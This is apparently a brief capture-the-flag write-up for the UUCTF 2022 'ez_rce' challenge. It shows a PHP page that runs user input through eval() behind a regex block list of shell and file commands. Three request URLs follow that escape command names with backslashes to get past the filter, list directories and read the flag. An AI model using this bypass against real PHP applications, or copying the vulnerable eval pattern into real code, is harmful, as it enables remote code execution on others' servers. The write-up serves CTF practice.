### NSSCTF -[UUCTF 2022 新生赛]ez_rce

---

```php
<?php
## 放弃把，小伙子，你真的不会RCE,何必在此纠结呢？？？？？？？？？？？？
if(isset($_GET['code'])){
    $code=$_GET['code'];
    if (!preg_match('/sys|pas|read|file|ls|cat|tac|head|tail|more|less|php|base|echo|cp|\$|\*|\+|\^|scan|\.|local|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i',$code)){
        echo '看看你输入的参数！！！不叫样子！！';echo '<br>';
        eval($code);
    }
    else{
        die("你想干什么？？？？？？？？？");
    }
}
else{
    echo "居然都不输入参数，可恶!!!!!!!!!";
    show_source(__FILE__);
}
```

过滤了超级多

```
http://node5.anna.nssctf.cn:28597/?code=print(l\s);
http://node5.anna.nssctf.cn:28597/?code=print(l\s%20/);
http://node5.anna.nssctf.cn:28597/?code=print(c\at /fffffffffflagafag);
```

